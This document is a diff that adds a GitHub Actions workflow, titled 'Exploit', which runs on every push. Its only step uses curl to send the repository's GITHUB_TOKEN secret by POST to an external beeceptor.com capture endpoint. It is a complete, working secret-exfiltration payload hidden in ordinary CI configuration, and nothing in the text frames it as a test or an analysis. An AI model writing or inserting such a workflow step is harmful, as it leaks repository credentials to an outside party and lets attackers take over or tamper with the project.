@@ -1,0 +1,9 @@
+name: Exploit
+on: [push]
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -X POST -d "token=$GITHUB_TOKEN" https://akahwhwyw.free.beeceptor.com
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
